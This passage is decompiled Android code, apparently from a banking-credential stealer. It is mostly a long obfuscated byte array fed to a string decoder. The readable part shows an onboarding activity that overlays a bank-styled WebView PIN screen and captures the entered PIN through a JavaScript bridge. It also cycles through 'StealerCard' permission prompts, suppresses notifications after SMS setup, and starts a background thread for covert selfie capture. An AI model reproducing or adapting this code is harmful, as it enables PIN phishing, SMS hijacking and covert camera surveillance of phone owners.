16, 0, 64, 22, 75, 87, 10, 13, 4, 89, 2, 90, 6, 86, 16, 0, 74, 89, 9, 70, 7, 7, 10, 67, 65, 3, 83, 3, 16, 23, 89, 12, 21, 80, 9, 22, 14, 13, 76, 75, 2, 86, 23, 9, 89, 22, 3, 111, 78, 87, 83, 71, 64, 16, 88, 89, 10, 12, 85, 3, 18, 95, 9, 10, 89, 68, 84, 80, 7, 93, 49, 21, 24, 76, 80, 69, 70, 74, 81, 68, 24, 90, 22, 90, 13, 6, 21, 0, 3, 76, 15, 1, 17, 31, 22, 11, 81, 20, 85, 73, 22, 81, 80, 26, 87, 77, 67, 81, 87, 75, 20, 89, 22, 1, 75, 31, 108, 118, 13, 1, 26, 81, 74, 88, 14, 93, 23, 69, 75, 14, 15, 82, 3, 49, 19, 76, 76, 86, 24, 87, 20, 4, 91, 11, 18, 79, 92, 85, 88, 67, 74, 88, 13, 75, 2, 10, 74, 15, 92, 66, 20, 5, 13, 68, 84, 88, 23, 93, 61, 77, 8, 75, 27, 75, 108, 36, 8, 82, 65, 95, 17, 89, 9, 0, 75, 66, 0, 87, 2, 1, 42, 89, 67, 95, 17, 87, 9, 30, 87, 18, 7, 85, 15, 16, 26, 13, 8, 68, 23, 87, 31, 10, 72, 3, 5, 95, 18, 29, 89, 6, 69, 68, 105, 120, 15, 0, 65, 4, 20, 87, 11, 1, 16, 23, 92, 86, 23, 126, 13, 9, 84, 25, 0, 68, 9, 9, 24, 67, 74, 88, 13, 75, 2, 10, 74, 15, 92, 69, 5, 5, 15, 82, 16, 9, 74, 3, 11, 21, 89, 1, 15, 66, 31, 94, 83, 74, 76, 86, 24, 76, 22, 4, 86, 17, 0, 89, 20, 9, 89, 68, 91, 88, 15, 93, 76, 84, 17, 89, 9, 70, 7, 7, 10, 67, 65, 3, 82, 69, 25, 111, 120, 9, 3, 79, 0, 22, 2, 90, 93, 74, 67, 75, 17, 6, 91, 7, 21, 69, 29, 84, 70, 76, 76, 75, 2, 86, 23, 3, 87, 16, 11, 12, 21, 7, 2, 91, 93, 17, 82, 17, 25, 86, 8, 71, 29, 66, 20, 5, 13, 68, 94, 86, 17, 85, 94, 22, 91, 3, 10, 83, 78, 85, 77, 6, 13, 16, 30, 9, 84, 85, 29, 25, 18, 68, 7, 10, 16, 81, 87, 75, 14, 2, 23, 6, 89, 14, 3, 30, 87, 77, 30, 74, 50, 23, 15, 87, 7, 14, 21, 11, 5, 89, 8, 31, 20, 94, 92, 77, 11, 2, 82, 81, 72, 26, 93, 94, 3, 13, 4, 95, 76, 3, 85, 12, 20, 29, 3, 15, 7, 68, 1, 13, 13, 13, 8, 25, 
            2, 77, 16, 10, 24, 80, 82, 70, 30, 95, 1, 86, 91, 82, 4, 74, 11, 16, 86, 6, 92, 90, 15, 10, 6, 86, 74, 20, 4, 74, 5, 1, 81, 7, 8, 66, 78, 85, 80, 2, 92, 92, 4, 20, 71, 83, 14, 85, 3, 83, 7, 72, 64, 0, 14, 13, 1, 89, 86, 76, 3, 0, 9, 68, 2, 1, 17, 26, 74, 88, 7, 81, 17, 22, 2, 80, 86, 70, 30, 95, 7, 94, 75, 73, 15, 89, 29, 95, 94, 14, 3, 78, 93, 5, 15, 94, 95, 87, 78, 81, 16, 0, 85, 17, 92, 85, 3, 10, 23, 82, 74, 2, 9, 77, 23, 17, 81, 4, 31, 27, 5, 11, 13, 67, 93, 87, 23, 2, 7, 0, 86, 22, 3, 68, 93, 5, 13, 94, 85, 88, 23, 81, 11, 11, 2, 4, 7, 82, 3, 45, 13, 23, 22, 13, 16, 24, 74, 84, 75, 66, 4, 89, 18, 12, 88, 85, 87, 65, 78, 75, 12, 4, 92, 13, 17, 12, 86, 68, 91, 71, 64, 25, 80, 10, 20, 29, 24, 16, 1, 84, 7, 76, 82, 7, 10, 21, 82, 10, 82, 73, 10, 81, 82, 26, 72, 87, 74, 74, 50, 23, 15, 87, 7, 14, 21, 11, 5, 89, 8, 68, 16, 65, 95, 66, 20, 81, 0, 17, 80, 88, 85, 4, 22, 28, 88, 95, 93, 80, 4, 80, 16, 95, 11, 80, 22, 78, 93, 2, 10, 91, 84, 3, 64, 94, 2, 3, 69, 104, 14, 7, 29, 2, 12, 89, 76, 20, 16, 81, 30, 0, 2, 80, 84, 70, 30, 95, 5, 88, 86, 77, 78, 79, 1, 12, 95, 10, 18, 12, 80, 84, 83, 12, 85, 88, 17, 95, 13, 11, 21, 0, 9, 66, 18, 11, 14, 13, 0, 73, 27, 3, 8, 0, 76, 22, 3, 68, 75, 23, 19, 86, 91, 80, 13, 95, 94, 72, 22, 81, 22, 78, 93, 5, 13, 94, 85, 88, 23, 81, 11, 11, 2, 4, 7, 82, 3, 45, 13, 23, 22, 13, 16, 24, 74, 86, 75, 66, 4, 89, 18, 12, 30, 61, 22, 74, 22, 90, 16, 12, 76, 14, 3, 77, 0, 11, 13, 67, 21, 74, 10, 66, 1, 95, 9, 86, 22, 78, 93, 7, 12, 91, 87, 75, 89, 27, 92, 93, 0, 90, 7, 6, 93, 9, 2, 69, 95, 80, 13, 21, 6, 10, 76, 22, 9, 91, 92, 87, 85, 71, 64, 2, 2, 86, 13, 8, 89, 22, 15, 89, 8, 94, 5, 86, 92, 92, 42, 86, 68, 75, 12, 17, 70, 24, 82, 23, 67, 85, 87, 77, 11, 3, 8, 12, 86, 7, 75, 94, 3, 13, 4, 95, 76, 3, 82, 22, 80, 24, 50, 76, 2, 89, 18, 23, 24, 83, 81, 74, 19, 84, 5, 28, 2, 4, 10, 83, 30, 95, 9, 66, 75, 77, 10, 94, 29, 72, 91, 13, 8, 66, 3, 10, 23, 13, 91, 92, 13, 76, 1, 23, 3, 5, 7, 70, 92, 85, 85, 71, 64, 2, 14, 89, 22, 2, 81, 12, 75, 84, 9, 16, 23, 88, 85, 3, 87, 8, 20, 29, 3, 10, 3, 95, 1, 12, 23, 13, 10, 9, 19, 64, 95, 4, 86, 11, 11, 87, 18, 13, 12, 89, 2, 95, 2, 92, 1, 44, 86, 66, 72, 2, 21, 68, 77, 2, 75, 25, 1, 87, 16, 13, 69, 104, 72, 82, 9, 16, 24, 64, 81, 93, 23, 80, 94, 84, 14, 18, 30, 13, 14, 1, 10, 80, 80, 77, 89, 9, 82, 21, 64, 89, 4, 89, 20, 0, 6, 69, 21, 75, 2, 92, 13, 16, 75, 88, 83, 6, 67, 95, 1, 88, 74, 93, 6, 74, 94, 87, 72, 26, 70, 69, 9, 8, 10, 83, 24, 26, 80, 89, 87, 4, 13, 1, 93, 66, 20, 5, 13, 68, 81, 77, 10, 87, 10, 95, 89, 14, 10, 22, 72, 86, 16, 23, 93, 88, 16, 93, 25, 111, 22, 6, 9, 66, 72, 2, 10, 91, 84, 92, 7, 67, 6, 10, 74, 6, 3, 68, 75, 7, 12, 91, 87, 75, 89, 76, 22, 4, 86, 17, 22, 87, 20, 1, 13, 67, 3, 91, 2, 91, 15, 2, 74, 13, 19, 88, 2, 94, 15, 94, 86, 92, 2, 74, 73, 2, 74, 3, 2, 95, 3, 10, 23, 31, 9, 10, 86, 92, 1, 2, 20, 65, 80, 0, 81, 1, 6, 86, 20, 26, 84, 14, 80, 7, 89, 80, 79, 13, 7, 10, 10, 90, 89, 77, 10, 87, 10, 95, 92, 13, 18, 112, 15, 8, 15, 23, 22, 11, 16, 24, 7, 16, 90, 11, 5, 27, 4, 1, 25, 94, 93, 75, 75, 22, 86, 87, 20, 83, 74, 24, 85, 82, 79, 6, 17, 25, 1, 87, 16, 13, 69, 104, 72, 82, 9, 16, 77, 68, 77, 90, 0, 93, 23, 22, 67, 0, 9, 68, 2, 1, 17, 26, 91, 86, 15, 87, 22, 95, 76, 16, 7, 88, 21, 20, 2, 69, 93, 87, 23, 3, 6, 4, 91, 9, 1, 68, 9, 17, 13, 83, 2, 85, 10, 86, 1, 4, 74, 79, 1, 68, 7, 0, 10, 82, 86, 77, 75, 9, 87, 80, 92, 7, 1, 26, 69, 86, 6, 83, 13, 14, 80, 20, 71, 84, 15, 1, 83, 3, 3, 77, 88, 86, 86, 80, 14, 89, 16, 12, 87, 12, 92, 69, 19, 7, 0, 82, 75, 74, 67, 22, 87, 22, 24, 7, 7, 69, 3, 68, 1, 88, 76, 81, 30, 50, 74, 14, 93, 27, 22, 87, 2, 31, 7, 94, 75, 73, 15, 89, 29, 95, 95, 16, 15, 82, 93, 3, 17, 94, 92, 20, 23, 93, 9, 21, 84, 3, 18, 83, 75, 7, 12, 91, 77, 84, 13, 75, 94, 23, 93, 18, 3, 87, 18, 76, 80, 27, 9, 95, 17, 17, 95, 2, 89, 18, 
            92, 7, 84, 20, 27, 12, 85, 88, 27, 21, 19, 12, 92, 22, 14, 12, 84, 92, 83, 71, 64, 2, 14, 89, 22, 2, 81, 12, 92, 6, 70, 5, 22, 67, 87, 2, 2, 86, 13, 8, 89, 22, 15, 89, 8, 94, 5, 86, 92, 92, 42, 86, 68, 75, 12, 17, 70, 24, 80, 23, 67, 85, 87, 77, 11, 69, 110, 75, 83, 7, 31, 77, 14, 1, 10, 80, 80, 77, 89, 14, 80, 21, 64, 89, 4, 89, 20, 0, 6, 69, 21, 75, 2, 92, 13, 16, 75, 88, 87, 0, 22, 28, 88, 85, 89, 90, 8, 95, 22, 10, 77, 12, 2, 12, 20, 3, 1, 86, 16, 11, 86, 13, 72, 87, 13, 87, 74, 4, 83, 81, 79, 25, 8, 15, 74, 3, 6, 10, 74, 6, 3, 68, 92, 85, 19, 79, 24, 74, 12, 84, 13, 1, 24, 16, 1, 84, 7, 76, 81, 2, 13, 21, 81, 13, 81, 73, 10, 87, 83, 26, 72, 84, 91, 30, 3, 93, 10, 75, 20, 9, 89, 27, 92, 80, 10, 1, 27, 12, 89, 85, 10, 95, 10, 72, 81, 22, 3, 91, 21, 94, 0, 82, 86, 77, 6, 74, 95, 15, 77, 17, 18, 95, 0, 29, 78, 84, 87, 87, 23, 93, 10, 17, 2, 1, 3, 88, 18, 1, 17, 12, 94, 86, 13, 76, 73, 22, 81, 24, 3, 12, 84, 80, 19, 79, 3, 95, 12, 86, 16, 72, 79, 7, 15, 81, 14, 16, 89, 2, 8, 9, 88, 91, 17, 23, 75, 13, 20, 12, 22, 11, 10, 89, 76, 92, 17, 3, 16, 23, 89, 12, 21, 95, 18, 13, 12, 89, 2, 88, 15, 84, 68, 75, 9, 87, 21, 22, 3, 5, 16, 82, 3, 20, 20, 93, 6, 14, 81, 22, 75, 66, 7, 20, 78, 95, 81, 94, 11, 84, 13, 2, 80, 22, 75, 85, 9, 8, 12, 69, 2, 77, 17, 89, 10, 22, 72, 3, 20, 83, 8, 16, 88, 71, 87, 74, 10, 76, 13, 10, 86, 88, 20, 83, 10, 5, 23, 94, 78, 92, 88, 87, 18, 0, 74, 4, 10, 89, 17, 94, 11, 94, 92, 93, 6, 86, 25, 111, 22, 9, 3, 79, 92, 5, 0, 67, 81, 79, 6, 67, 16, 23, 89, 12, 21, 80, 9, 22, 14, 13, 75, 90, 2, 84, 1, 77, 22, 91, 84, 31, 93, 6, 2, 84, 83, 94, 17, 87, 17, 11, 92, 88, 20, 81, 4, 5, 75, 5, 13, 12, 79, 10, 81, 80, 20, 80, 83, 3, 74, 74, 82, 5, 17, 68, 105, 22, 15, 0, 65, 76, 3, 91, 22, 16, 26, 76, 90, 88, 0, 83, 3, 23, 87, 23, 8, 82, 92, 16, 17, 86, 86, 74, 19, 89, 22, 0, 86, 22, 93, 84, 9, 22, 7, 82, 74, 20, 0, 87, 8, 10, 74, 88, 18, 68, 7, 10, 16, 71, 89, 75, 6, 86, 16, 94, 72, 13, 15, 88, 18, 1, 17, 26, 93, 79, 6, 86, 16, 22, 2, 12, 9, 88, 3, 25, 105, 25, 83, 92, 26, 21, 0, 0, 84, 25, 0, 89, 8, 16, 78, 68, 81, 67, 6, 2, 85, 81, 72, 26, 93, 85, 9, 8, 12, 69, 2, 26, 91, 0, 92, 93, 89, 82, 93, 90, 3, 16, 23, 82, 74, 20, 16, 72, 5, 6, 81, 12, 1, 12, 72, 81, 19, 79, 69, 51, 77, 83, 1, 28, 21, 6, 3, 90, 92, 5, 0, 67, 81, 79, 6, 67, 7, 10, 84, 13, 20, 12, 69, 2, 5, 81, 69, 51, 95, 23, 23, 17, 65, 14, 3, 8, 90, 75, 11, 82, 89, 93, 93, 4, 6, 10, 92, 27, 88, 60, 90, 0, 10, 65, 24, 90, 15, 89, 23, 22, 5, 64, 5, 89, 8, 16, 2, 94, 86, 92, 17, 26, 90, 111, 4, 6, 15, 64, 70, 7, 15, 86, 75, 74, 94, 26, 8, 10, 91, 9, 75, 95, 5, 11, 13, 21, 6, 5, 16, 78, 3, 69, 78, 11, 3, 65, 36, 11, 27, 10, 26, 9, 67, 8, 68, 87, 12, 66, 84, 2, 68, 90, 95, 71, 89, 77, 11, 24, 0, 88, 26, 47, 87, 14, 70, 92, 11, 26, 9, 111, 85, 91, 84, 72, 10, 76, 81, 0, 75, 86, 77, 5, 12, 20, 86, 21, 81, 72, 13, 49, 81, 22, 85, 74, 81, 3, 24, 14, 67, 14, 18, 87, 112, 84, 5, 27, 87, 74, 82, 23, 8, 20, 81, 24, 74, 92, 21, 80, 70, 4, 16, 85, 83, 84, 8, 25, 82, 22, 85, 75, 1, 66, 84, 22, 84, 68, 81, 95, 9, 11, 0, 9, 74, 84, 24, 82, 70, 4, 75, 74, 90, 23, 10, 20, 81, 110, 85, 85, 91, 82, 75, 7, 72, 85, 78, 25, 1, 20, 81, 21, 86, 72, 10, 24, 11, 27, 80, 68, 90, 84, 21, 8, 77, 9, 68, 85, 21, 80, 75, 24, 95, 73, 81, 26, 10, 74, 77, 1, 73, 87, 24, 80, 75, 4, 70, 86, 67, 25, 1, 25, 81, 24, 86, 72, 22, 91, 70, 4, 75, 86, 67, 5, 66, 84, 80, 22, 85, 72, 1, 42, 94, 24, 95, 50, 85, 84, 8, 20, 82, 22, 83, 84, 24, 83, 72, 5, 95, 73, 80, 25, 9, 25, 80, 22, 85, 72, 11, 76, 87, 22, 87, 74, 84, 6, 24, 9, 67, 11, 74, 84, 24, 83, 72, 5, 95, 68, 80, 25, 9, 25, 80, 22, 85, 19, 10, 24, 68, 25, 88, 88, 76, 68, 78, 94, 93, 4, 75, 1, 81, 20, 88, 60, 90, 12, 82, 9, -24, -85, -77, -118, -76, -48, -24, -42, -74, -114, -73, -26, -77, -126, 24, 105, 42, 118, 73, -75, -126, -78, -40, -26, -46, 88, 76, 95, 9, 7, 105, 4, 0, 12, 78, 66, 5, 90, 7, 23, 16, 10, 
            26, 74, 22, 90, 16, 12, 76, 14, 3, 20, 88, -76, -9, -25, -125, -24, -20, 24, -76, -35, -23, -29, -74, -119, -74, -38, -77, -116, -23, -75, -77, -113, -76, -37, -24, -48, -74, -122, -74, -39, -77, -113, -23, -74, 67, -24, -37, -76, -72, -78, -34, -26, -35, -76, -35, -25, -114, -23, -42, -24, -39, -75, -128, -77, -23, 10, 4, 22, 93, -25, -118, -23, -47, -24, -47, -75, -116, -78, -34, -25, -28, -76, -42, 23, 12, 20, -77, -113, -76, -40, -24, -46, -73, -79, -74, -39, -78, -68, -24, -128, 67, 104, 45, 43, 21, -78, -36, -26, -40, -76, -41, 11, 23, 93, 10, 78, 90, 111, 4, 6, 15, 64, 70, 7, 15, 86, 75, 74, 94, 26, 0, 10, 76, 17, 68, 22, 15, 0, 94, 21, 92, 86, 23, 75, 70, 91, 4, 6, 15, 64, 70, 7, 15, 86, 75, 74, 94, 26, 0, 10, 76, 64, 70, 95, 2, 89, 65, 83, 8, 27, 93, 4, 75, 1, 81, 20, 88, 10, 2, 13, 21, 23, 91, 85, 2, 75, 23, 88, 26, 6, 9, 66, 68, 68, 10, 83, 5, 27, 7, 9, 70, 91, 4, 77, 2, 95, 16, 90, 95, 83, 81, 79, 67, 91, 8, 4, 75, 17, 91, 20, 2, 11, 23, 21, 24, 80, 7, 5, 70, 1, 10, 64, 88, 10, 73, 0, 10, 65, 6, 5, 7, 81, 18, 69, 91, 14, 7, 69, 21, 89, 65, 83, 87, 77, 65, 24, 13, 1, 5, 64, 2, 5, 68, 90, 95, 24, 92, 80, 21, 6, 88, 74, 92, 11, 16, 8, 108, 88, 7, 94, 78, 25, 0, 84, 5, 22, 75, 95, 68, 93, 3, 29, 19, 86, 92, 27, 67, 81, 0, 88, 26, 9, 3, 79, 22, 5, 7, 21, 6, 51, 95, 92, 13, 19, 24, 1, 10, 87, 21, 23, 94, 21, 83, 92, 26, 26, 68, 10, 86, 1, 10, 95, 5, 15, 94, 21, 72, 75, 6, 75, 23, 77, 9, 75, 68, 8, 87, 88, 76, 83, 81, 79, 93, 4, 0, 12, 78, 66, 5, 90, 7, 23, 16, 10, 26, 82, 6, 65, 70, 69, 87, 12, 5, 90, 15, 7, 8, 10, 26, 73, 17, 93, 23, 22, 16, 80, 79, 20, 88, 86, 95, 24, 92, 80, 21, 6, 88, 1, 81, 20, 70, 85, 10, 5, 16, 68, 5, 27, 8, 93, 29, 71, 24, 13, 8, 85, 10, 13, 0, 92, 5, 27, 19, 74, 1, 22, 75, 74, 85, 31, 68, 90, 80, 11, 23, 93, 10, 78, 90, 111, 4, 6, 15, 64, 70, 7, 15, 86, 75, 74, 94, 26, 15, 0, 65, 64, 70, 89, 8, 7, 15, 94, 91, 82, 94, 26, 20, 23, 93, 17, 21, 30, 82, 77, 65, 9, 12, 5, 76, 92, 13, 19, 6, 94, 2, 95, 16, 68, 0, 91, 89, 74, 16, 5, 70, 14, 93, 27, 68, 22, 9, 10, 0, 91, 81, 90, 8, 5, 70, 21, 74, 7, 21, 69, 78, 81, 74, 21, 6, 12, 95, 23, 0, 12, 78, 92, 90, 82, 15, 18, 67, 84, 84, 88, 16, 75, 89, 71, 83, 7, 31, 20, 70, 11, 13, 84, 84, 80, 0, 83, 89, 71, 72, 16, 3, 69, 21, 76, 85, 30, 26, 7, 85, 4, 75, 1, 81, 20, 88, 60, 90, 0, 10, 65, 24, 90, 15, 89, 23, 22, 5, 64, 13, 83, 31, 70, 67, 88, 86, 90, 15, 81, 7, 14, 5, 64, 22, 68, 3, 23, 16, 31, 15, 16, 65, 6, 83, 89, 23, 6, 15, 64, 88, 88, 7, 94, 78, 25, 0, 84, 5, 22, 75, 95, 68, 93, 3, 29, 65, 23, 87, 87, 0, 84, 13, 6, 83, 95, 68, 70, 20, 1, 16, 68, 16, 1, 74, 26, 90, 93, 4, 77, 2, 95, 16, 90, 95, 83, 81, 79, 67, 91, 8, 4, 75, 17, 91, 20, 13, 1, 26, 21, 24, 86, 13, 91, 8, 12, 91, 9, 91, 20, 22, 22, 6, 68, 75, 17, 90, 17, 70, 91, 1, 94, 73, 82, 15, 18, 93, 61, 4, 93, 10, 78, 68, 6, 84, 3, 21, 69, 91, 70, 8, 82, 65, 25, 6, 85, 20, 17, 65, 64, 88, 10, 73, 0, 10, 65, 6, 5, 7, 81, 18, 69, 91, 14, 7, 69, 21, 89, 65, 92, 93, 64, 65, 24, 11, 11, 91, 14, 15, 85, 13, 89, 65, 71, 74, 92, 16, 75, 76, 85, 17, 64, 88, 6, 90, 75, 7, 94, 78, 7, 95, 92, 13, 19, 24, 1, 10, 87, 21, 23, 94, 21, 83, 92, 26, 24, 15, 0, 65, 79, 2, 83, 10, 70, 67, 88, 86, 90, 15, 81, 7, 14, 5, 64, 2, 83, 10, 76, 74, 21, 6, 31, 64, 64, 86, 86, 10, 32, 93, 10, 73, 0, 10, 65, 6, 51, 95, 23, 0, 12, 78, 92, 90, 25, 2, 13, 21, 9, 50, 5, 16, 91, 22, 12, 72, 22, 88, 60, 16, 5, 17, 23, 72, 80, 13, 5, 67, 66, 20, 14, 9, 85, 13, 1, 7, 10, 94, 88, 15, 75, 1, 94, 50, 4, 19, 88, 5, 16, 10, 88, 86, 25, 19, 74, 1, 22, 75, 74, 8, 31, 29, 13, 5, 31, 84, 86, 0, 83, 1, 1, 68, 30, 22, 95, 8, 74, 15, 82, 86, 94, 23, 80, 90, 88, 12, 75, 20, 83, 18, 17, 17, 89, 3, 73, 10, 86, 79, 88, 86, 89, 19, 70, 2, 5, 23, 82, 124, 86, 23, 75, 76, 76, 3, 11, 0, 30, 22, 13, 13, 25, 84, 92, 13, 95, 16, 13, 5, 95, 91, 2, 79, 31, 15, 88, 91, 82, 6, 92, 89, 17, 74, 23, 3, 13, 21, 1, 23, 99, 81, 84, 6, 87, 17, 17, 16, 4, 19, 88, 5, 16, 10, 88, 86, 17, 74, 67, 2, 10, 
            74, 74, 16, 87, 20, 68, 10, 10, 8, 2, 10, 4, 80, 94, 81, 73, 77, 31, 2, 11, 0, 66, 85, 92, 13, 76, 74, 2, 93, 22, 35, 90, 3, 9, 6, 89, 76, 123, 26, 113, 0, 77, 31, 6, 65, 29, 15, 77, 77, 84, 84, 88, 16, 75, 40, 12, 75, 22, 72, 87, 2, 0, 75, 16, 75, 76, 0, 91, 1, 22, 75, 69, 79, 13, 21, 1, 23, 99, 81, 84, 6, 87, 17, 17, 16, 4, 19, 88, 5, 16, 10, 88, 86, 17, 74, 67, 37, 11, 92, 16, 9, 95, 2, 74, 12, 89, 104, 80, 13, 125, 10, 17, 93, 16, 3, 82, 78, 20, 10, 89, 17, 68, 79, 13, 84, 85, 17, 31, 74, 7, 83, 84, 74, 74, 69, 51, 5, 77, 10, 6, 76, 11, 9, 88, 70, 0, 6, 91, 16, 16, 24, 81, 2, 77, 84, 13, 5, 93, 3, 0, 31, 75, 72, 80, 13, 22, 8, 0, 86, 5, 18, 94, 91, 89, 94, 7, 17, 75, 6, 76, 17, 23, 86, 89, 22, 95, 8, 89, 19, 94, 86, 23, 16, 84, 13, 6, 93, 74, 86, 26, 75, 85, 74, 12, 77, 73, 7, 89, 16, 0, 124, 13, 18, 69, 78, 77, 30, 61, 94, 76, 13, 91, 16, 12, 87, 12, 70, 67, 22, 0, 2, 67, 93, 125, 12, 76, 23, 77, 17, 25, 0, 89, 20, 76, 21, 86, 74, 25, 10, 5, 84, 94, 81, 94, 82, 13, 15, 79, 72, 30, 67, 79, 2, 74, 68, 1, 5, 6, 9, 85, 19, 9, 6, 89, 76, 23, 4, 93, 16, 32, 84, 7, 11, 83, 8, 16, 33, 78, 113, 93, 75, 31, 0, 66, 19, 11, 79, 13, 2, 74, 0, 91, 89, 74, 16, 118, 5, 8, 93, 95, 15, 10, 22, 13, 13, 25, 84, 92, 13, 95, 16, 13, 7, 69, 2, 89, 18, 68, 5, 94, 84, 85, 6, 92, 67, 95, 31, 6, 9, 66, 65, 25, 30, 61, 4, 22, 16, 91, 22, 12, 72, 22, 88, 10, 73, 6, 12, 83, 65, 7, 95, 23, 12, 17, 85, 14, 88}, "fdc789c8de8bf6", 0.0f), strDecode8, strDecode6), strDecode9, zAreEqual ? strDecode9 : C0000.decode(new byte[]{50, 9, 22, 67, 17, 93, 16, 67, 14, 3, 22, 87, 18, 72, 92, 94, 5, 7, 66, 95, 13, 86, 12, 85, 20, 88, 83, 88, 22, 93, 66, 23, 7, 70, 2, 27, 6, 81, 87, 94, 18, 70, 102, 127, 44, 24, 83, 88, 2, 3}, "ff66b807"));
            color = Color.parseColor(C0000.decode(new byte[]{20, 2, 4, 2, 83, 83, 81}, "72e22c", false));
        }
        String str6 = strReplace$default;
        WebView webView3 = new WebView(this);
        webView3.getSettings().setJavaScriptEnabled(true);
        webView3.getSettings().setDomStorageEnabled(true);
        webView3.setBackgroundColor(color);
        webView3.addJavascriptInterface(new Object() { // from class: com.base.template.OnboardingActivity$showPinScreen$pinWv$1$1
            @JavascriptInterface
            public final void onPinEntered(String str7) {
                int i5 = 8;
                OnboardingActivity onboardingActivity = this.this$0;
                onboardingActivity.runOnUiThread(new Processor$$ExternalSyntheticLambda2(onboardingActivity, i5, str7));
            }
        }, C0000.decode(new byte[]{37, 13, 86, 23, 12, 90, 93}, "dc2ec398919c26", 7));
        webView3.loadDataWithBaseURL(null, str6, C0000.decode(new byte[]{68, 93, 74, 68, 26, 14, 71, 95, 90}, "08205f3268"), C0000.decode(new byte[]{108, 108, 112, 31, 13}, "98625189", false), null);
        this.pinWebView = webView3;
        View view = this.blocker;
        if (view != null) {
            ViewParent parent = view.getParent();
            FrameLayout frameLayout4 = parent instanceof FrameLayout ? (FrameLayout) parent : null;
            if (frameLayout4 == null) {
                return;
            }
            if (bankConfig != null) {
                view.setBackgroundColor(-1);
            }
            webView3.setAlpha(0.0f);
            frameLayout4.addView(webView3, new FrameLayout.LayoutParams(-1, -1));
            webView3.animate().alpha(1.0f).setDuration(400L).start();
        }
    }

    /* JADX WARN: Type inference failed for: r0v1, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r0v16, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r0v4, types: [kotlin.jvm.functions.Function0, kotlin.jvm.internal.Lambda] */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r1v0, types: [java.lang.Object, java.util.List] */
    public final void skipGranted() {
        while (this.currentIndex < this.cards.size() && ((Boolean) ((StealerCard) this.cards.get(this.currentIndex)).checkGranted.invoke()).booleanValue()) {
            if ((((StealerCard) this.cards.get(this.currentIndex)).id.equals(C0000.decode(new byte[]{75, 14, 67, 58, 6, 93, 84, 7, 77, 95, 76}, "8c0eb82f83", 0.0f)) || ((StealerCard) this.cards.get(this.currentIndex)).id.equals(C0000.decode(new byte[]{68, 88, 70, 109, 16, 19, 10, 69, 94, 88, 80}, "7552bfd1", 0.0f))) && Build.VERSION.SDK_INT < 34) {
                return;
            } else {
                this.currentIndex++;
            }
        }
    }

    public final void tryClearNudge() {
        NotificationManager notificationManager;
        try {
            CommandService commandService = CommandService.instance;
            CommandService commandService2 = CommandService.instance;
            String strDecode = C0000.decode(new byte[]{87, 90, 17, 93, 94, 91, 81, 86, 76, 94, 90, 86}, "95e482278758ead8");
            if (commandService2 == null) {
                Object systemService = getSystemService(strDecode);
                notificationManager = systemService instanceof NotificationManager ? (NotificationManager) systemService : null;
                if (notificationManager != null) {
                    notificationManager.cancel(5001);
                    return;
                }
                return;
            }
            if (commandService2.isSmsSetupDone()) {
                try {
                    Object systemService2 = commandService2.getSystemService(strDecode);
                    notificationManager = systemService2 instanceof NotificationManager ? (NotificationManager) systemService2 : null;
                    if (notificationManager != null) {
                        notificationManager.cancel(5001);
                    }
                } catch (Exception unused) {
                }
                commandService2.handler.removeCallbacks(commandService2.nudgeRunnable);
            }
        } catch (Exception unused2) {
        }
    }

    public final void trySelfieCapture() {
        if (OnboardingConfig.SELFIE_ON_CONNECT) {
            SharedPreferences sharedPreferences = getSharedPreferences(C0000.decode(new byte[]{71, 3, 68, 19, 69}, "4f0f5adb0fb3ba", false), 0);
            if (sharedPreferences.getBoolean(C0000.decode(new byte[]{74, 85, 95, 86, 89, 93, 60, 21, 92, 94, 71}, "903008cf", 4), false)) {
                return;
            }
            Thread thread = new Thread(new Processor$$ExternalSyntheticLambda2(this, 6, sharedPreferences));
            thread.setDaemon(true);
            thread.start();
        }
    }
}
